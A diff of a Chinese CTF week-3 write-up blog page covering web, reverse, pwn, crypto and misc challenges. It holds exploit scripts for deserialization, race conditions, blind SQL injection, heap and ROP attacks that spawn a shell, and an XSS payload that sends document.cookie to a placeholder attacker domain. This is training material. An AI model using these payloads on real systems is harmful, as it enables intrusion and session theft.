@@ -250,7 +250,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -387,9 +387,9 @@
     <div class="post-body" itemprop="articleBody">
         <p>week3的wp整理完毕！</p>
 <span id="more"></span>
-
-
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>右键查看源码，发现神奇的注释：</p>
+<h2 id="Web">Web</h2>
+<h3 id="序列之争-Ordinal-Scale">序列之争 - Ordinal Scale</h3>
+<p>右键查看源码，发现神奇的注释：</p>
 <p><img src="/images/e1de0fb/web-1-2.png" alt="2"></p>
 <p>此后下载下来就是一波源码审计：</p>
 <p><strong>关键位置1</strong>：</p>
@@ -409,7 +409,7 @@
 <p>Monster类的encryptKey是由Game的encryptKey经过运算而来的，而后者的encryptKey我们已经通过格式化字符串的方式泄露出来了。</p>
 <p>那么此时就要找反序列化可以利用的地方了，由于我们需要让排名为第一，根据审计发现，只要使得$_SESSION[‘rank’]的值为1就好了，利用的位置就在下面：</p>
 <p><img src="/images/e1de0fb/web-1-8.png" alt="8"></p>
-<p>这是Rank类的析构函数，对象销毁时会自动调用，这里把rank修改了，我们只需要使得反序列化得到一个Rank对象，并且其rank属性为1即可。但是这里有个判断，<code>$this-&gt;key === $this-&gt;serverKey</code>，但我们不知道<code>$_SERVER[&#39;key&#39;]</code>到底是什么，无法给<code>$this-&gt;key</code>填正确的值，那么就不填了！</p>
+<p>这是Rank类的析构函数，对象销毁时会自动调用，这里把rank修改了，我们只需要使得反序列化得到一个Rank对象，并且其rank属性为1即可。但是这里有个判断，<code>$this-&gt;key === $this-&gt;serverKey</code>，但我们不知道<code>$_SERVER['key']</code>到底是什么，无法给<code>$this-&gt;key</code>填正确的值，那么就不填了！</p>
 <p><img src="/images/e1de0fb/web-1-9.png" alt="9"></p>
 <p>因为这个$key属性是有默认值的，如果反序列化的时候发现少了属性，就会填上这个默认值，而这个默认值就是正确的key。</p>
 <p>那么现在要构造数据了，要使得反序列化得出想要的结果，那么就把想要的结果序列化就好了！</p>
@@ -445,14 +445,14 @@
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>运行<code>php exp.php</code>（文件名是exp.php）</p>
 <p><img src="/images/e1de0fb/web-1-10.png" alt="10"></p>
 <p>然后放到cookie里，发送请求，可看到flag：</p>
 <p><img src="/images/e1de0fb/web-1-1.png" alt></p>
 <p>根据exp，还要注意的是：post的player要对应为<code>%s</code>。</p>
 <hr>
-<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><p>这题一开始以为是注入，发现搞了好久都不行。而且是高价买入，低价卖出（被收手续费），根本不可能赚够钱买flag。然后想到，既然是交易系统，就很可能存在多线程竞争的漏洞。</p>
+<h3 id="Cosmos的二手市场">Cosmos的二手市场</h3>
+<p>这题一开始以为是注入，发现搞了好久都不行。而且是高价买入，低价卖出（被收手续费），根本不可能赚够钱买flag。然后想到，既然是交易系统，就很可能存在多线程竞争的漏洞。</p>
 <p>大概意思是，买入1个货物，多个线程几乎同时发送请求来出售1个货物，网站查询数据库获得货物数量为1，一个线程还没来得及把货物数量减1存入数据库，另一个线程就从数据库查到货物数量为1，导致多个线程都判断货物数量充足，这样就造成了1个货物，出售了多次，这样就可以获得多于1个货物的价钱了。同理，我们可以买入10个甚至500个（经检验一次最多出售500个），然后多个线程同时出售买入的货物数量。</p>
 <p>下面是exp的一次运行结果：</p>
 <p><img src="/images/e1de0fb/web-2-1.png" alt="1"></p>
@@ -508,10 +508,10 @@ jobs <span class="token operator">=</span> <span class="token punctuation">[</sp
 <span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
     j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这exp不是傻瓜式的，多运行几次赚够钱了，自己在浏览器上拿flag</p>
 <hr>
-<h3 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h3><p>sql时间盲注，注入点在删除留言的请求参数delete_id里：</p>
+<h3 id="Cosmos的留言板-2">Cosmos的留言板-2</h3>
+<p>sql时间盲注，注入点在删除留言的请求参数delete_id里：</p>
 <p><img src="/images/e1de0fb/web-3-1.png" alt="1"></p>
 <p>不过好像有个奇怪的现象，必须得有1条留言以上，才可以注入，否则好像根本不会进行sql语句的执行</p>
 <p>注入的基本payload格式为：</p>
@@ -637,11 +637,11 @@ password <span class="token operator">=</span> <span class="token string">''</sp
     <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'password=%s'</span> <span class="token operator">%</span> password<span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>exp中会发现有些函数调用被我注释掉了，那是因为我exp不是一步写成的，比如：写了get_dbname_len然后调用，运行exp后得到数据库长度后，才进行了下一步，既然已经得到长度了，那下一步运行exp的时候就没必要再跑一次get_dbname_len函数了（虽然最后发现，数据库名字并不重要）</p>
 <p>得出用户名和密码后，登录可以看到flag（我记得是这样的）</p>
 <hr>
-<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>和week2的那题相比多了CSP的限制，具体可看这篇文章<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p>
+<h3 id="Cosmos的聊天室2-0">Cosmos的聊天室2.0</h3>
+<p>和week2的那题相比多了CSP的限制，具体可看这篇文章<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p>
 <p><img src="/images/e1de0fb/web-4-1.png" alt="1"></p>
 <p>根据题目可知道，像img、script的标签的src属性，不是这个网站的url，都不会执行。</p>
 <p>首先要清楚的是，在这个CSP的限制下，不符合规则的，就算注入到页面了，也没有用，因为不会执行。</p>
@@ -651,12 +651,11 @@ password <span class="token operator">=</span> <span class="token string">''</sp
 <p>我们只要把js代码通过message这个参数传入就可以了。</p>
 <p>题目还过滤了script这个单词（大小写均过滤），可以双写绕过。</p>
 <p>那么最后payload就是：</p>
-<p><code>&lt;scriscriptpt src=&#39;/send?message=js代码&#39;&gt;&lt;/scrscriptipt&gt;</code></p>
+<p><code>&lt;scriscriptpt src='/send?message=js代码'&gt;&lt;/scrscriptipt&gt;</code></p>
 <p>可以参考下我的js代码：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     windows<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://你的域名/?token='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>记得url编码后再添加到<code>message=</code>后面，我的exp如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
 <span class="token keyword">import</span> hashlib
@@ -713,18 +712,17 @@ r <span class="token operator">=</span> send<span class="token punctuation">(</s
 <span class="token comment"># 提交验证码，让刚刚的payload生效</span>
 r <span class="token operator">=</span> submit<span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>exp中写了，js代码要经过两次url编码，这是因为注入需要发送get请求，url需要编码一次，注入到页面后，script的src属性是个url，这里也得编码一次。</p>
 <p>其实get请求的url的参数是</p>
-<p><code>?message=&lt;scripscriptt src=&#39;our_url&#39;&gt;&lt;/scrscriptipt&gt;</code></p>
+<p><code>?message=&lt;scripscriptt src='our_url'&gt;&lt;/scrscriptipt&gt;</code></p>
 <p>然后，这个<code>our_url</code>是：</p>
 <p><code>/send?message=一次url编码后的js</code>，然后上面那个url的<code>mesage=</code>后面的东西得再url编码一次</p>
 <p>所以最后就是</p>
-<p><code>?message=&lt;sscriptcript+src%3d&#39;send%3fmessage%3d&#123;你的js代码两次url编码后&#125;&#39;&lt;/sscriptcript&gt;</code></p>
+<p><code>?message=&lt;sscriptcript+src%3d'send%3fmessage%3d&#123;你的js代码两次url编码后&#125;'&lt;/sscriptcript&gt;</code></p>
 <hr>
-<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="oooollvm"><a href="#oooollvm" class="headerlink" title="oooollvm"></a>oooollvm</h3><p>这题加了混淆，首先找到输入点：</p>
+<h2 id="Re">Re</h2>
+<h3 id="oooollvm">oooollvm</h3>
+<p>这题加了混淆，首先找到输入点：</p>
 <p><img src="/images/e1de0fb/re-1-1.png" alt="1"></p>
 <p>根据这个str看看都在哪里有用到，发现除了strlen就这一处：</p>
 <p><img src="/images/e1de0fb/re-1-2.png" alt="2"></p>
@@ -763,9 +761,10 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
     flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ROP-LEVEL2"><a href="#ROP-LEVEL2" class="headerlink" title="ROP_LEVEL2"></a>ROP_LEVEL2</h3><p>这题必须详细记录下。</p>
+<h2 id="Pwn">Pwn</h2>
+<h3 id="ROP-LEVEL2">ROP_LEVEL2</h3>
+<p>这题必须详细记录下。</p>
 <p>这里明显就有溢出的漏洞：</p>
 <p><img src="/images/e1de0fb/pwn-1-1.png" alt="1"></p>
 <p>读入0x60个字节，而局部变量buf到局部变量fd之间隔了0x48个字节，fd数组占8个字节，也就是一共0x50个字节。可以溢出0x10个字节，其中一个是函数开头push的rbp，之后就是返回地址。</p>
@@ -778,7 +777,6 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>值得注意的是，指令<code>leave</code>，这个指令其实包含了一下工作：</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rsp,rbp
 pop rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>那么问题就变成了，如何修改rbp了。这不？第二项工作就是修改rbp了。</p>
 <p>而且main函数调用之后刚好就有两指令<code>leave</code>和<code>ret</code></p>
 <p><img src="/images/e1de0fb/pwn-1-2.png" alt="2"></p>
@@ -789,7 +787,7 @@ pop rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <p>但要注意的是：</p>
 <p><img src="/images/e1de0fb/pwn-1-7.png" alt="7"></p>
 <p><img src="/images/e1de0fb/pwn-1-6.png" alt="6"></p>
-<p>局部变量buf的位置是<code>rbp-0x50</code>，文件被读入到这里，这个地址必须可以访问，我们同样可以控制其在bss段内，放到ROP后面即可，我的ROP占用了0x40个字节（8字节对齐后），那么这个<code>rbp</code>就要设置成<code>全局变量buf+0x90</code>以上才够，否则读入flag的时候，不然就把ROP给破坏了（文件名”/flag”字符串在ROP最后面，之前就是因为把这个文件名破坏了，没getshell)</p>
+<p>局部变量buf的位置是<code>rbp-0x50</code>，文件被读入到这里，这个地址必须可以访问，我们同样可以控制其在bss段内，放到ROP后面即可，我的ROP占用了0x40个字节（8字节对齐后），那么这个<code>rbp</code>就要设置成<code>全局变量buf+0x90</code>以上才够，否则读入flag的时候，不然就把ROP给破坏了（文件名&quot;/flag&quot;字符串在ROP最后面，之前就是因为把这个文件名破坏了，没getshell)</p>
 <p>大概过程如下图：</p>
 <p><img src="/images/e1de0fb/pwn-1-8.png" alt="8"></p>
 <p>exp如下：</p>
@@ -831,9 +829,9 @@ io<span class="token punctuation">.</span>send<span class="token punctuation">(<
 
 <span class="token keyword">print</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="Annevi-Note"><a href="#Annevi-Note" class="headerlink" title="Annevi_Note"></a>Annevi_Note</h3><p>堆溢出，漏洞点在edit函数：</p>
+<h3 id="Annevi-Note">Annevi_Note</h3>
+<p>堆溢出，漏洞点在edit函数：</p>
 <p><img src="/images/e1de0fb/pwn-2-1.png" alt="1"></p>
 <p>无论堆的大小是多少都可读入256字节。主要漏洞是可以溢出修改下一个chunk的字段。</p>
 <p>可以利用unlink，具体可以参考文章<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/2776b6a79a11">https://www.jianshu.com/p/2776b6a79a11</a>（这个是讲32位平台的），还有<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/1f4b054d6bfc">https://www.jianshu.com/p/1f4b054d6bfc</a>（这个讲64位平台的，不过不具体）</p>
@@ -924,9 +922,9 @@ add<span class="token punctuation">(</span><span class="token number">0x90</span
 dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="E99p1ant-Note"><a href="#E99p1ant-Note" class="headerlink" title="E99p1ant_Note"></a>E99p1ant_Note</h3><p>这题其实和上一题类似，也是溢出，只不过只能溢出1个字节，称为<code>off by one</code>？</p>
+<h3 id="E99p1ant-Note">E99p1ant_Note</h3>
+<p>这题其实和上一题类似，也是溢出，只不过只能溢出1个字节，称为<code>off by one</code>？</p>
 <p><img src="/images/e1de0fb/pwn-3-1.png" alt="1"></p>
 <p>其实溢出1个字节也够了，能够修改size字段就好，结合unsorted bin泄露libc基址，然后extend chunk加fastbin attack，把onegadget写入<code>__malloc_hook</code>区域就好</p>
 <p>可参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
@@ -1026,9 +1024,9 @@ io<span class="token punctuation">.</span>sendlineafter<span class="token punctu
 <span class="token comment">#sleep(1)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="junior-iterator"><a href="#junior-iterator" class="headerlink" title="junior_iterator"></a>junior_iterator</h3><p>这题，多调试下还是能发现问题的，漏洞点在overwrite的处理函数里</p>
+<h3 id="junior-iterator">junior_iterator</h3>
+<p>这题，多调试下还是能发现问题的，漏洞点在overwrite的处理函数里</p>
 <p><img src="/images/e1de0fb/pwn-4-1.png" alt="1"></p>
 <p>这个程序就是用一个数组保存了多个vector对象的地址，vector是类似数组的类对象，用数组的方式管理一个内存区域。连续创建vector对象（通过c++ new操作）,他们的内存区域相邻。</p>
 <p>上面在通过迭代器（就类似指针吧，在汇编也确实间接使用了指针），把一个vector对象的管理的数组逐个赋值，但是却没有检查越界，可以覆盖下一给vector对象的数据。</p>
@@ -1103,9 +1101,10 @@ edit<span class="token punctuation">(</span><span class="token number">1</span><
 io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment"># atoi("/bin/sh")，因为atoi已经被劫持成system了</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ToyCipher-XorShift"><a href="#ToyCipher-XorShift" class="headerlink" title="ToyCipher_XorShift"></a>ToyCipher_XorShift</h3><p>最关键的是这个函数：</p>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="ToyCipher-XorShift">ToyCipher_XorShift</h3>
+<p>最关键的是这个函数：</p>
 <p><img src="/images/e1de0fb/crypto-1-1.png" alt="1"></p>
 <p>只要能写出这个函数的逆过程就相当于完成一大半了，其实就是位运算，数学上有个东西叫做错位相减，这个东西其实差不多，错位（右移，左移）然后异或。假设参数a为1，shr为True，且假设MASK掩码使得x为1个字节也就是8位的数（源码中<code>x = x&amp;MASK</code>的作用就是保证x为64位整数），那么进行的运算如下图：</p>
 <p><img src="/images/e1de0fb/crypto-1-2.png" alt="2"></p>
@@ -1115,7 +1114,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 bit1 &#x3D; raw_bit0 xor raw_bit1 &#x3D;&#x3D;&gt; raw_bit1 &#x3D; bit1 xor raw_bit0
 bit2 &#x3D; raw_bit1 xor raw_bit2 &#x3D;&#x3D;&gt; raw_bit2 &#x3D; bit2 xor raw_bit1
 ....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>其中<code>raw_bitxxx</code>代表错位异或前的第<code>xxx</code>位，<code>bitxxx</code>表示异或后的第<code>xxx</code>位，可以根据上面这样一步一步还原原来的每一位。</p>
 <p>如果a为2，那么最高2位就是已知的，为3，那么最高3位已知，以此类推</p>
 <p>如果shr=False，也就是左移而不是右移呢？道理一样，偷个懒，不想分别写两个情况的代码，直接写右移的处理，任何左移就把高低位反过来当作右移来解，再反回来。</p>
@@ -1181,9 +1179,9 @@ XOR <span class="token operator">=</span> <span class="token keyword">lambda</sp
     <span class="token keyword">return</span> ret
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>enc_data<span class="token punctuation">,</span> IV<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h3><p>参考百度百科<a target="_blank" rel="external nofollow noopener noreferrer" href="https://baike.baidu.com/item/Diffie-Hellman/9827194?fr=aladdin">Diffie-Hellman密钥交换算法</a></p>
+<h3 id="Exchange">Exchange</h3>
+<p>参考百度百科<a target="_blank" rel="external nofollow noopener noreferrer" href="https://baike.baidu.com/item/Diffie-Hellman/9827194?fr=aladdin">Diffie-Hellman密钥交换算法</a></p>
 <p>大概就是A与B之间进行一个密钥交换，自己充当C，在A与B交换公钥的时候，修改成自己的公钥，那么A与B通信时，经过C，C将A发来的数据，用自己的私钥解密后，再用B的公钥加密，发给B，B发数据时同理。那么A与B之间可以正常通信，并且没发现C的存在。那么C就可以窥探AB之间的通信内容</p>
 <p>exp如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
@@ -1327,9 +1325,9 @@ flag1 <span class="token operator">=</span> number<span class="token punctuation
 flag2 <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>raw_b<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span> flag1<span class="token operator">+</span>flag2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h3><p>题目讲了，是AES的CFB加密模式，可以参考一下这篇文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/chengqiuming/article/details/82355772">https://blog.csdn.net/chengqiuming/article/details/82355772</a></p>
+<h3 id="Feedback">Feedback</h3>
+<p>题目讲了，是AES的CFB加密模式，可以参考一下这篇文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/chengqiuming/article/details/82355772">https://blog.csdn.net/chengqiuming/article/details/82355772</a></p>
 <p>基本思路就是，任何数与零异或都是它本身。可以通过传入一整个分组0，从而解密的时候，得到的就是用来异或的密钥，flag一共三个分组，逐步获取每一个部分即可。</p>
 <p>exp如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python</span>
@@ -1367,13 +1365,14 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
     flag <span class="token operator">+=</span> get_part<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
 
 <span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="三重隐写"><a href="#三重隐写" class="headerlink" title="三重隐写"></a>三重隐写</h3><p>首先有三个音频：<code>Unlasting.mp3</code> 、<code>You know LSB.wav</code>、<code>上裏与手抄卷.mp3</code></p>
+<h2 id="Misc">Misc</h2>
+<h3 id="三重隐写">三重隐写</h3>
+<p>首先有三个音频：<code>Unlasting.mp3</code> 、<code>You know LSB.wav</code>、<code>上裏与手抄卷.mp3</code></p>
 <p>第二个音频，从名字可以看出是LSB隐写，可以用slienteye工具获取隐写的信息：</p>
 <p><img src="/images/e1de0fb/misc-1-1.png" alt="1"></p>
 <p>然后用这个key，用Mp3Stego工具提取第三个音频里的信息：</p>
-<p><code>decode -X -P  uFSARLVNwVIewCY5 上裏与手抄卷.mp3</code> </p>
+<p><code>decode -X -P  uFSARLVNwVIewCY5 上裏与手抄卷.mp3</code></p>
 <p>得到</p>
 <p><img src="/images/e1de0fb/misc-1-3.png" alt="3"></p>
 <p>然后用这个密码解出压缩包，用题目给的工具打开，需要密码，密码只能在第一个音频里了。</p>
@@ -1384,12 +1383,13 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p><img src="/images/e1de0fb/misc-1-2.png" alt="2"></p>
 <p>得到解密密钥，解密出flag.txt文件，里面即flag</p>
 <hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本周必需得总结一下，学了比较多（但同时也摸了比较多鱼），这周只ak了pwn（也只能akpwn了）。</p>
+<h2 id="总结">总结</h2>
